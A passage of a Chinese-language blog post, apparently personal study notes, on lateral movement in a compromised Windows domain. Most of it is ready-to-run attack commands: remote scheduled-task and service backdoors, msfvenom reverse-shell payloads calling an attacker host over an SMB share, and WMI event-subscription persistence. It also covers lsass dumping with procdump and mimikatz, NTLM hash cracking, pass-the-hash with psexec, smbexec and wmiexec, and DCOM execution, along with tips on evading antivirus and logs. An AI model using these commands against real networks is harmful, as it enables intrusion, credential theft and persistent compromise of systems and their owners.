                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230301145843892.png"
                      alt="image-20230301145843892"
                ></p>
<p>首先利用信息收集工具收集到域控主机的地址信息，然后利用这个地址信息建立ipc连接，在利用已经攻陷的web服务器主机向域控主机复一个add.bat文件，该文件内容为创建一个用户（实际中一般植入病毒后门），再利用at定时自动执行在域上执行该文件，则就建立了一个用户schtasks &gt;&#x3D; windows 2012</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230301150838876.png"
                      alt="image-20230301150838876"
                ></p>
<h6 id="impacket"><a href="#impacket" class="headerlink" title="impacket"></a>impacket</h6><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230301152547387.png"
                      alt="image-20230301152547387"
                ></p>
<p>计划任务</p>
<p><code>schtasks /Create /S 192.168.30.30 /TN Backdoor /SC minute /MO 1 /TR C:\reverse_tcp.exe /RU System /F</code></p>
<p>立即执行</p>
<p><code>schtasks /RUN /S 192.168.30.30 /I /TN Backdoor</code></p>
<p>删除</p>
<p><code>schtasks /Delete /S 192.168.30.30 /TN Backdoor /F</code></p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">#也可以通过将命令的文件写入文件，通过type命令读取</span><br><span class="line">schtasks /Create /S 19.168.30.30 /TN Backdoor /SC minute /MO 1 /TR &quot;C:\Windows\System32\cmd.exe /c &#x27;whoami&#x27; &gt; C:\resulit.txt&quot; /RU System /f</span><br><span class="line"></span><br><span class="line">type \\192.168.30.30\C$\result.txt     #读取执行结果</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>



<h6 id="UNC路径加载执行"><a href="#UNC路径加载执行" class="headerlink" title="UNC路径加载执行"></a>UNC路径加载执行</h6><p>Windows可以利用UNC路径来访问网络共享资源</p>
<p>1.现在服务器中搭建SMB匿名共享服务，并生成攻击载荷放入共享目录</p>
<p>2.执行</p>
<p><code>schtasks /Create /S 10.10.10.19 /TN Backdoor /SC minute /MO 1 /TR \\192.168.2.143\ evilsmb\reverse_tcp.exe /RU System /F /U Administrator /P Admin@123</code></p>
<p>在远程主机10.10.10.19中创建计划任务，使用UNC路径加载位于192.168.2.143共享中的攻击载荷并执行</p>
<h3 id="WMI的利用"><a href="#WMI的利用" class="headerlink" title="WMI的利用"></a>WMI的利用</h3><p>WMI是Windows管理技术，通过调用WMI类的方法进行远程执行</p>
<p>执行远程查询，查询远程主机的进程信息</p>
<p><code>wmic /node:192.168.30.10 /user:Administrator /password:Admin!@#45 process li st brief</code></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230317174150555.png"
                      alt="image-20230317174150555"
                ></p>
<p>创建远程进程</p>
<p><code>wmic /node:192.168.30.10 /user:Administrator /password:Admin!@#45 process call create &quot;cmd.exe /c ipconfig &gt; C:\jieguo.txt&quot;</code></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230317174534828.png"
                      alt="image-20230317174534828"
                ></p>
<p>因为没有回显所以需要利用type进行查看</p>
<p><code>type \\192.168.30.10\C$\jieguo.txt</code></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230317174549486.png"
                      alt="image-20230317174549486"
                ></p>
<p>还可以使用远程安装MSI文件</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">使用msf生成一个msi恶意文件</span><br><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.2.143 Lport=4444 -f msi -o reverse_tcp.msi</span><br><span class="line">建立共享服务器SMB</span><br><span class="line">在跳板机上执行</span><br><span class="line">wmic /node:192.168.30.10 /user:Administrator /password:Admin!@#45 priduct call install PackageLocation=&quot;\\SMB服务器IP\服务名\reverse_tcp.msi&quot;</span><br></pre></td></tr></table></figure></div>

<h4 id=""><a href="#" class="headerlink" title=""></a></h4><h3 id="winRM的利用"><a href="#winRM的利用" class="headerlink" title="winRM的利用"></a>winRM的利用</h3><p>通过winRM执行远程命令</p>
<p>执行以下命令，手动将目的IP添加到客户端信任列表TrustedHosts</p>
<p><code>winrm set winrm/config/client @&#123;TrustedHosts=&quot;192.168.30.10&quot;&#125;</code></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230317220135483.png"
                      alt="image-20230317220135483"
                ></p>
<p><code>Set-Item WSMan:localhost\client\trustedhosts -value *</code></p>
<p>上面这个命令是在powershell上面执行的</p>
<h6 id="winrs"><a href="#winrs" class="headerlink" title="winrs"></a>winrs</h6><p>Winrm是Windows远程管理的客户端程序，允许通过提供的用户凭据，在winRM服务器上执行命令</p>
<p>在远程主机上执行<code>winrs -r http://192.168.30.10:5985 -u:Administrator -p:Admin!@#45 &quot;whoami&quot;</code></p>
<p>也可以直接在上面whoami的位置输入cmd打开cmd</p>
<h6 id="Winrm-cmd"><a href="#Winrm-cmd" class="headerlink" title="Winrm.cmd"></a>Winrm.cmd</h6><p>Winrm.cmd允许WMI对象通过WinRM传输进行远程交互</p>
<h3 id="系统服务利用"><a href="#系统服务利用" class="headerlink" title="系统服务利用"></a>系统服务利用</h3><h4 id="创建远程服务"><a href="#创建远程服务" class="headerlink" title="创建远程服务"></a>创建远程服务</h4><p>先建立ipc共享</p>
<p>然后<code>sc \\192.168.30.30 create Backdoor binpath= &quot;cmd.exe /k C:\rever_tcp.exe&quot;</code></p>
<p>注意&#x3D;后面要有空格</p>
<p>执行<code>sc \\192.168.30.30 start Backdoor</code></p>
<p>删除服务<code>sc \\192.168.30.30 delete Backdoor</code></p>
<h4 id="利用全部步骤："><a href="#利用全部步骤：" class="headerlink" title="利用全部步骤："></a>利用全部步骤：</h4><p>先利用信息收集部分的指令得到该域内各个主机的地址信息等</p>
<p>for &#x2F;L %I in (1,1,254) Do @ping -w 1 -n 1 192.168.3.%I | findstr “TTL&#x3D;”  检测存活ip</p>
<p>再利用mimikatz获取已控制主机的密码</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230301154749779.png"
                      alt="image-20230301154749779"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230301154815697.png"
                      alt="image-20230301154815697"
                ></p>
<p>然后利用批量impacket脚本批量探测，再找到另外一个主机一样的密码</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230301161036660.png"
                      alt="image-20230301161036660"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230301155730960.png"
                      alt="image-20230301155730960"
                ></p>
<p>发现有一个具有system权限，说明该主机有跟本主机一样的密码，</p>
<p>所以可以在现在发现的这个主机上再次使用mimikatz找新的密码，然后以此类推用这个密码再次探测各个主机地址</p>
<p>直到找到域控密码</p>
<p>得到密码之后就可以利用at或者schtasks进行攻击，至此完整过程完成</p>
<h4 id="psexec-amp-smbexec以及wmic-amp-wmiexec"><a href="#psexec-amp-smbexec以及wmic-amp-wmiexec" class="headerlink" title="psexec&amp;smbexec以及wmic&amp;wmiexec"></a>psexec&amp;smbexec以及wmic&amp;wmiexec</h4><p>前瞻知识：</p>
<p>1.windows2012之后系统默认关闭wigest，攻击者无法从内存中获取明文密码，2012之前的版本如果安装KB2871997补丁。也会导致这样</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230302091720681.png"
                      alt="image-20230302091720681"
                ></p>
<h5 id="procdump-mimikatz的配合获取"><a href="#procdump-mimikatz的配合获取" class="headerlink" title="procdump+mimikatz的配合获取"></a>procdump+mimikatz的配合获取</h5><p>procdump -accepteula -ma lsass.exe lsass.dmp  </p>
<p>   #在目标主机上执行该条命令，得到了lsass.dmp文件，之后就是将这个文件移动到我们的本地主机，使用mimikatz进行恢复</p>
<p>然后在mimikatz上执行</p>
<p>privilege::debug</p>
<p>sekurlsa::minidump lsass.dmp </p>
<p>sekurlsa::logonpasswords full</p>
<p>原理：Mimikatz属于第三方软件，直接上传到目标主机可能 杀毒软件查杀，这时我们可以配合官方软件Procdump，将Procdump上传目标主机获取用户信息(该文件不可读)，使用本地的Mimikatz打开Procdump获取的用户信息。</p>
<h5 id="hashcat破解NTLM-hash-kali系统自带"><a href="#hashcat破解NTLM-hash-kali系统自带" class="headerlink" title="hashcat破解NTLM hash(kali系统自带)"></a>hashcat破解NTLM hash(kali系统自带)</h5><p>—爆破命令：hashcat -a 0 -m 1000 hash file –force</p>
<p>—-a, –attack-mode&#x3D;NUM         攻击模式，其值参考后面对参数。“-a 0”字典攻击，“-a 1” 组合攻击；“-a 3”掩码攻击。（这里是字典攻击）</p>
<p>— -m 1000指向的是NTLM Hash哈希协议</p>
<p>—hash是要破解的哈希字符串，file为字典的地址</p>
<h5 id="域横向移动smb服务利用–psexec，，smbexec（官方自带）"><a href="#域横向移动smb服务利用–psexec，，smbexec（官方自带）" class="headerlink" title="域横向移动smb服务利用–psexec，，smbexec（官方自带）"></a>域横向移动smb服务利用–psexec，，smbexec（官方自带）</h5><p>利用smb服务可以通过明文或者hash传递来远程执行，必要条件是445端口要开启和Admin$共享</p>
<p>主要连接到SMB服务端的Admin$共享，并且释放psexesvc.exe，注册PSEXESVC服务，然后通过PSEXESVC服务进行命令执行</p>
<p>简要来说就是用这些工具来远程得到目标主机的system权限</p>
<h6 id="psexec"><a href="#psexec" class="headerlink" title="psexec"></a>psexec</h6><p>存在两种连接方式：</p>
<ol>
<li>先有 ipc 链接，psexec 需要明文或hash 传递</li>
</ol>
<p>先建立ipc连接：<code>net use \\192.168.3.32\ipc$ &quot;admin!@#45&quot; /user:administrator（密码是前期信息收集获取）</code></p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/61ebf51eba2c47386868d4c0c3ad5be5aab0cadb.png@831w_224h_progressive.webp"
                      alt="img" style="zoom:150%;" 
                >

<p>—以system权限运行cmd: psexec \192.168.3.32 -s cmd（发现为系统权限）</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/81503bc903d891f81ae6212759bd1e9c9ece321a.png@824w_354h_progressive.webp"
                      alt="img"
                ></p>
<p>2.不用建立IPC直接提供明文账户密码（推荐原因：建立IPC链接可能会失败）</p>
<p><code>psexec --accepteula \\192.168.3.21 -u（用户） administrator -p（密码） Admin12345 -s（系统权限） cmd（运行cmd） </code></p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/9695a079ec035707a26619612833bd79c3a062e8.png@831w_246h_progressive.webp"
                      alt="img" style="zoom:150%;" 
                >



<p>如果没有明文密码，只有hash密码的话官方的pstools不能使用，这时候就需要使用impacket中别人二改的psexec.exe</p>
<p>psexec.exe -hashes :518b98ad4178a53695dc997aa02d455c .&#x2F;<a class="link"   href="mailto:&#x61;&#x64;&#109;&#x69;&#x6e;&#105;&#115;&#x74;&#114;&#97;&#116;&#111;&#x72;&#x40;&#x31;&#57;&#50;&#46;&#49;&#x36;&#56;&#x2e;&#x33;&#46;&#51;&#50;" >&#x61;&#x64;&#109;&#x69;&#x6e;&#105;&#115;&#x74;&#114;&#97;&#116;&#111;&#x72;&#x40;&#x31;&#57;&#50;&#46;&#49;&#x36;&#56;&#x2e;&#x33;&#46;&#51;&#50; <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> </p>
<h6 id="smbexec（无需先ipc连接-明文传递）"><a href="#smbexec（无需先ipc连接-明文传递）" class="headerlink" title="smbexec（无需先ipc连接 明文传递）"></a>smbexec（无需先ipc连接 明文传递）</h6><p>连接sqlserver的非域内主机</p>
<p>smbexec .&#x2F;administrator:admin!@#45  @192.168.3.32 </p>
<p>链接sqlserver的域内用户</p>
<p>smbexec .god&#x2F;administrator:Admin12345  @192.168.3.32</p>
<p>建立哈希连接（sqlserver的非域管理员）：</p>
<p>smbexec -hashes :518b98ad4178a53695dc997aa02d455c .&#x2F;administrator  @192.168.3.32 </p>
<p>通过域用户中域管理员登陆sqlserver服务器（域管理员可以登陆域内任意主机）</p>
<p>smbexec -hashes :ccef208c6485269c20db2cad21734fe7 god&#x2F;<a class="link"   href="mailto:&#97;&#x64;&#109;&#x69;&#110;&#105;&#115;&#116;&#114;&#97;&#116;&#x6f;&#x72;&#64;&#49;&#x39;&#x32;&#46;&#49;&#54;&#56;&#x2e;&#51;&#x2e;&#x33;&#x32;" >&#97;&#x64;&#109;&#x69;&#110;&#105;&#115;&#116;&#114;&#97;&#116;&#x6f;&#x72;&#64;&#49;&#x39;&#x32;&#46;&#49;&#54;&#56;&#x2e;&#51;&#x2e;&#x33;&#x32; <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h6 id="wmiexec"><a href="#wmiexec" class="headerlink" title="wmiexec"></a>wmiexec</h6><p>使用命令</p>
<p><code>wmiexec HACK-MY/Administrator:Admin!@#45@192.168.30.10</code>连接域内主机，就可以远程命令控制</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230317202047275.png"
                      alt="image-20230317202047275"
                ></p>
<h5 id="域横向移动WMI服务利用"><a href="#域横向移动WMI服务利用" class="headerlink" title="域横向移动WMI服务利用"></a>域横向移动WMI服务利用</h5><p>WMI是一种Windows管理规范可以通过WMI管理本地用户和远程计算机，提供两个协议分布式组件对象模型、Windows远程管理</p>
<p>WMI服务是通过本地135端口进行利用的，支持用户名明文或者哈希的方式进行认证，并且该方法不会在目标日志系统留下痕迹</p>
<p>常见的控制方法有</p>
<p>1.通过调用WMI的类的方法进行远程执行如Win32_Process类中的Create方法可以远程主机上创建进程，利用install安装恶意MSI</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">使用metasploit生成恶意的MSI</span><br><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.2.143 LPORT=4444 -F MSI -O reverse_tcp.msi</span><br><span class="line">服务器上搭建SMB共享服务器，并放入msi</span><br><span class="line">跳板机上执行</span><br><span class="line">wmic /node:101.10.10.19 /user:Administrator /password:Admin@123 product call install packageLocation=&quot;\\192.168.2.143\evilsmb\reverse_tcp.msi&quot;</span><br><span class="line">成功获取权限</span><br></pre></td></tr></table></figure></div>



<p>2.远程部署WMI实践订阅，条件触发攻击</p>
<p>1.自带WMIC明文传递 无回显</p>
<p>wmic &#x2F;node:192.168.3.21 &#x2F;user:administrator &#x2F;password:Admin12345 process call create “cmd.exe &#x2F;c ipconfig &gt;C:\1.txt”</p>
<p>2.自带cscript明文传递，有回显（需要wmiexec.vbs文件，不支持hash）</p>
<p>cscript &#x2F;&#x2F;nologo wmiexec.vbs &#x2F;shell 192.168.3.21 administrator Admin12345 </p>
<p>3.impacket wmiexec套件，明文传递，支持hash，有回显，但是得做免杀</p>
<p>连接域sqlserver执行命令：</p>
<p>wmiexec .&#x2F;administrator:admin!@#45    @192.168.3.32 “whoami”（或者”ipconfig”） </p>
<p>明文连接域控：</p>
<p>wmiexec god&#x2F;administrator:Admin12345    @192.168.3.21 “whoami”</p>
<p>哈希分别连接sqlserver和域控</p>
<p>wmiexec -hashes :518b98ad4178a53695dc997aa02d455c .&#x2F;<a class="link"   href="mailto:&#97;&#100;&#109;&#x69;&#x6e;&#x69;&#115;&#116;&#114;&#97;&#116;&#111;&#114;&#x40;&#x31;&#x39;&#x32;&#46;&#49;&#x36;&#x38;&#46;&#51;&#46;&#51;&#50;" >&#97;&#100;&#109;&#x69;&#x6e;&#x69;&#115;&#116;&#114;&#97;&#116;&#111;&#114;&#x40;&#x31;&#x39;&#x32;&#46;&#49;&#x36;&#x38;&#46;&#51;&#46;&#51;&#50; <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> “whoami”</p>
<p>wmiexec -hashes :ccef208c6485269c20db2cad21734fe7 god&#x2F;<a class="link"   href="mailto:&#x61;&#x64;&#109;&#x69;&#x6e;&#105;&#115;&#x74;&#114;&#97;&#x74;&#x6f;&#114;&#x40;&#49;&#x39;&#50;&#46;&#x31;&#54;&#56;&#46;&#51;&#x2e;&#x32;&#49;" >&#x61;&#x64;&#109;&#x69;&#x6e;&#105;&#115;&#x74;&#114;&#97;&#x74;&#x6f;&#114;&#x40;&#49;&#x39;&#50;&#46;&#x31;&#54;&#56;&#46;&#51;&#x2e;&#x32;&#49; <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> “whoami”</p>
<h6 id="WMI订阅事件"><a href="#WMI订阅事件" class="headerlink" title="WMI订阅事件"></a>WMI订阅事件</h6><p>相当于一个条件触发事件，其中条件被称为“事件过滤器”，做出的响应称为“事件消费者”</p>
<p>部署事件订阅的时候，需要分别构建Filter以及Consumer，且绑定一起</p>
<p>手动利用</p>
<p>1.整合PSCredential用于后续过程的认证</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">$Username= &quot;HACK-MY\Administrator&quot;</span><br><span class="line">$Password=&quot;Admin!@#45&quot;</span><br><span class="line">$SecurePassword= $Password | ConvertTo-SecureString -AsPlainText -Force</span><br><span class="line">$Credential = New-Object -Typename Syetem.Management.Automation.PSCredential -ArgumentList $Username,$SecurePassword</span><br></pre></td></tr></table></figure></div>

<p>2.设置攻击目标和其他公共参数</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">$GlobalArgs = @&#123;&#125;</span><br><span class="line">$ComputerName =&quot;192.168.30.10&quot;</span><br><span class="line">$GlobalArgs[&#x27;Credential&#x27;] = $Credential</span><br><span class="line">$GlobalArgs[&#x27;ComputerName&#x27;] = $ComputerName</span><br></pre></td></tr></table></figure></div>

<p>3.在远程主机上部署RestFilter</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">$EventFilterArgs = @&#123;</span><br><span class="line">       EventNamespace = &#x27;root/cimv2&#x27;</span><br><span class="line">       Name = &quot;TestFilter&quot;</span><br><span class="line">       Ouery = &quot;SELECT * FROM Win32_ProcessStartTrace where processname =&#x27;svchost.exe&#x27;&quot;</span><br><span class="line">       QueryLanguage =&#x27;WQL&#x27;</span><br><span class="line">             &#125;</span><br><span class="line">$EventFilter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments $EventFilterArgs @GlobalArgs</span><br></pre></td></tr></table></figure></div>

<p>4.在远程主机部署一个叫“TestConsumer”的事件消费者</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">$CommandLineEventConsumerArgs =@&#123;</span><br><span class="line">          Name =&quot;TestConsumer&quot;</span><br><span class="line">          CommandLineTemplate =&quot;C:\Windows\System32\cmd.exe /c calc.exe&quot;</span><br><span class="line">                                &#125;</span><br><span class="line">$EventConsumer = Set-WmiInstance -Namespace root \subscription -Class</span><br><span class="line">    CommandLineEventConsumer -Arguments $CommandLineEventConsumerArgs @GlobalArgs</span><br></pre></td></tr></table></figure></div>

<p>5.将事件消费者和事件过滤器绑定一起</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">$FilterConsumerBindingArgs= &#123;</span><br><span class="line">      Filter = $EventFilter</span><br><span class="line">      Consumer = $EventConsumer</span><br><span class="line">                            &#125;</span><br><span class="line">$FilterConsumerBinding = Set-WmiInstance -Namespace root\subscription -Class</span><br><span class="line">    __FilterToConsumerBinding -Arguments $FilterConsumerBindingArgs @GlobalArgs</span><br></pre></td></tr></table></figure></div>

<p>如此一个事件订阅已经部署了，当远程系统轮询到svchost.exe进程产生时，将通过事件消费者执行系统命令来启动cale.exe进程</p>
<p>Sharp-WMIEvent利用</p>
<p>1.先在smb共享服务器上放入攻击载荷</p>
<p>2.在跳板机上执行以下命令，运行Sharp-WMIEvent</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Sharp-WMIEvent -Trigger Interval -IntervalPeriod 60 -CommputerName 192.168.30.10 -Domain hack-my.com -Username Administrator -Password Admin!@#45 -Command &quot;cmd.exe / c \\SMB服务器IP\evilsmb服务名称\reverse_tcp.exe&quot;</span><br></pre></td></tr></table></figure></div>

<p> 这会在远程主机上部署一个随机命名的永久事件订阅，并每隔60秒执行以此攻击载荷，使远程主机上线</p>
<h5 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h5><p>1.信息收集，mimikatz实现密码收集</p>
<p>2.使用命令检测存活ip     for &#x2F;L %I in (1,1,254) Do @ping -w 1 -n 1 192.168.3.%I | findstr “TTL&#x3D;”     并排除自己本机的IP地址</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230302112713483.png"
                      alt="image-20230302112713483"
                ></p>
<p>然后收集域用户信息</p>
<p>3.通过ipc等连接来验证域内主机的用户和密码</p>
<p>4.通过命令或者工具箱进行提权</p>
<p>5.重复进行操作，直到获取域控的权限</p>
<h5 id="域横向移动以上服务hash批量利用-python编译exe"><a href="#域横向移动以上服务hash批量利用-python编译exe" class="headerlink" title="域横向移动以上服务hash批量利用-python编译exe"></a>域横向移动以上服务hash批量利用-python编译exe</h5><p>—收集明文或哈希密码（这个是Web本地用户）</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/c254c9e8488c3621f704255c4119d978a5398b34.png@783w_288h_progressive.webp"
                      alt="img"
                ></p>
<p>—探测同网段存活主机</p>
<p>for &#x2F;L %I in (1,1,254) DO @ping -w 1 -n 1 192.168.3.%I | findstr “TTL&#x3D;”（用for循环去ping1-254网段的主机，这是自带内部命令，不会被杀毒软件拦截，我这里只开了DC&#x2F;WEB&#x2F;SQL&#x2F;File）</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/a32f6cd76d5f7ee9d05348ab3ca8f1d622c0978c.png@831w_87h_progressive.webp"
                      alt="img"
                ></p>
<p>—探测域内用户</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/b19abce24e85642feee983b541402857a2f72f1c.png@831w_408h_progressive.webp"
                      alt="img"
                ></p>
<p>#至此，我们已经收集到了IP，用户名，和密码hash。我们可以写一个python脚本，然后转换成exe批量利用</p>
<p>—写入ip字典，用户字典，哈希密码字典</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/cfa491a8137591a7437af3f5eb8c7b177b994d25.png@597w_527h_progressive.webp"
                      alt="img" style="zoom:150%;" 
                >

<p>—ip、用户、哈希密码三重变化，连接域用户和本地用户</p>
<p>—采用套件impacket包中，wmiexec明文或hash传递，有回显exe版本，但是易被杀（要做免杀）（这里注意whoami前面有空格）</p>
<p>—并且该方法不会在目标日志系统留下痕迹</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/0e2b7e27c57a91b1367529f3ab5d0727aa245468.png@831w_371h_progressive.webp"
                      alt="img"
                ></p>
<p>—将Python脚本复制到Script目录</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/1d73721d1e18e01d245ad03070eb2cc5865f81c4.png@813w_209h_progressive.webp"
                      alt="img"
                ></p>
<p>—在Script目录执行命令：pyinstaller.exe -F fuck_neiwang_002.py</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/838ea2110e71032e60b3fd71e1e729bcad2256e3.png@831w_252h_progressive.webp"
                      alt="img"
                ></p>
<p>—在Script目录下dist目录发现exe文件，复制到域Web靶机执行</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/308612a5f913f9ea1cee905ff22db757ddf83d96.png@831w_234h_progressive.webp"
                      alt="img"
                ></p>
<p>—运行exe文件，注意要和impacket包中wmiexec.exe文件同路径</p>
<p>—发现192.168.3.32的本地管理员用户（Administrator）和字典的哈希密码一致</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/15d8f700dd18d364be7f668e7db63bd273d42146.png@831w_129h_progressive.webp"
                      alt="img"
                ></p>
<p>—在192.168.3.32主机运行minikatz，获取到一个新的密码hash（第一个是连接的，第二个是新获取的，假设只找到了hash）</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/6cb861791e073abaf6e6aecac1036b3c8f68c756.png@831w_336h_progressive.webp"
                      alt="img"
                ><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/091c2301d888752e9bb70dcf4c48182ec8a712a8.png@831w_266h_progressive.webp"
                      alt="img"
                ></p>
<p>—但是查看域用户发现没有这个sqlserver的用户</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/1331e4aed28b4e607714d79bd8634b54fdb5224f.png@831w_306h_progressive.webp"
                      alt="img"
                ></p>
<p>—在sqlserver本地查看，也没有sqlserver用户，由于是连接的本地用户，所以盲猜是本地用户的一个哈希密码，但是不知道是以下哪一个。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/d610ad1369fe1a88ccf868c2db805d4ba1dbb403.png@735w_236h_progressive.webp"
                      alt="img"
                ></p>
<p>—不知道为啥SQL的主机的域dbadmin用户没连接上，他俩的密码都是一样的，按道理本地连接上了域用户也可以才对</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/4779e1676f6086f5e8a9a99ca3b76ec0a061dc08.png@831w_108h_progressive.webp"
                      alt="img"
                ></p>
<p>—通过在sqlserver上获取的密码和用户账户，添加到Python脚本的字典里面，那么能够获取的域内用户的哈希密码越来越多</p>
<p>—这里一般都获取到域内主机的本地用户的密码，我猜测通过这些哈希密码字典去爆破域控。因为即使获取到域内用户的正确密码，但是没有域管理员权限是无法通过mimikatz获取内存的密码。</p>
<p>—但是即使如此，我们可以通过搜集域内用户的凭据信息来丰富明文和哈希字典</p>
<h4 id="域横向COM和DCOM"><a href="#域横向COM和DCOM" class="headerlink" title="域横向COM和DCOM"></a>域横向COM和DCOM</h4><h6 id="1-COM"><a href="#1-COM" class="headerlink" title="1. COM"></a>1. COM</h6><p>com是微软的一套软件组件的二进制接口标准，使跨编程语言的进程间通信、动态对象创建成为可能</p>
<h6 id="2-DCOM"><a href="#2-DCOM" class="headerlink" title="2. DCOM"></a>2. DCOM</h6><p>DCOM 是基于组件对象模型的一系列概念和程序接口，支持不同机器上的组件间的通信。利用DCOM，客户端程序能够请求来自网络中另一台计算机上的服务器程序对象</p>
<h5 id="通过DCOM横向移动"><a href="#通过DCOM横向移动" class="headerlink" title="通过DCOM横向移动"></a>通过DCOM横向移动</h5><p>可以使用<code>Get-CimInstance win32_dcomapplication</code>这个命令列出计算机上所有的DCOM组件</p>
<h6 id="1-MMC20-Application"><a href="#1-MMC20-Application" class="headerlink" title="1.MMC20.Application"></a>1.MMC20.Application</h6><p>利用MMC20.Application组件在远程主机上执行攻击荷载，并上线meterpreper</p>
<ol>
<li><p>在一台可控服务器上搭建smb匿名共享服务，并将生成发攻击荷载放入共享目录。</p>
</li>
<li><p>在管理员权限的powershell中执行</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">通过ProgID与DCOM进行远程交互，并创建MMC20.Application对象的实例</span><br><span class="line">$com=[activator]::createinstance([type]::GetTypeFromProID(&quot;MMC20.Application&quot;,&quot;10.10.10.19&quot;))</span><br><span class="line">调用ExecuteShellCommond方法启动进程，以运行攻击载荷</span><br><span class="line">$com.Document.ActiveView.ExecuteShellCommond(&#x27;cmd.exe&#x27;,$null,&quot;/c\\192.168.2.134\evilsmb&quot;)</span><br></pre></td></tr></table></figure></div></li>
</ol>
<p>2.ShellWindows</p>
